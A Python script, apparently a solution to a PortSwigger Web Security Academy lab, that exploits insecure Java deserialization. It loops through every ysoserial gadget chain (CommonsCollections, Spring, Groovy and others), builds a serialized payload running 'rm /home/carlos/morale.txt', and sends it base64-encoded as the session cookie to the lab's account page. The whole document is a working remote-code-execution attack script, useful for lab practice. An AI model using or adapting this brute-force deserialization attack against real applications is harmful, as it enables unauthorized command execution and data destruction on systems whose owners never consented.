import os
import requests
from urllib import parse

raw_payloads = """AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                                           
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         
     Clojure             @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                                       
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
     CommonsCollections1 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections2 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections3 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections4 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                                             
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                                             
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                            
     Groovy1             @frohoff                               groovy:2.3.9                                                                                                                                                                                        
     Hibernate1          @mbechler                                                                                                                                                                                                                                  
     Hibernate2          @mbechler                                                                                                                                                                                                                                  
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            
     JRMPClient          @mbechler                                                                                                                                                                                                                                  
     JRMPListener        @mbechler                                                                                                                                                                                                                                  
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        
     Jdk7u21             @frohoff                                                                                                                                                                                                                                   
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                                             
     MozillaRhino1       @matthias_kaiser                       js:1.7R2                                                                                                                                                                                            
     MozillaRhino2       @_tint0                                js:1.7R2                                                                                                                                                                                            
     Myfaces1            @mbechler                                                                                                                                                                                                                                  
     Myfaces2            @mbechler                                                                                                                                                                                                                                  
     ROME                @mbechler                              rome:1.0                                                                                                                                                                                            
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
     URLDNS              @gebl                                                                                                                                                                                                                                      
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4"""

payloads = [c.split()[0] for c in raw_payloads.split("\n"[0])]
url = "https://0a6000d00329883c8282292900090072.web-security-academy.net/my-account?id=wiener"
headers = {
    "Host": "0a6000d00329883c8282292900090072.web-security-academy.net",
}
cookies = {
    "session": "payload"
}

for payload in payloads:
    os.system("java -jar ysoserial-all.jar " + payload + " 'rm /home/carlos/morale.txt' | base64 > payload.txt")
    cookies["session"] = parse.quote(open("./payload.txt", "r").read())
    res = requests.get(url, headers=headers, cookies=cookies)

    print(res.text)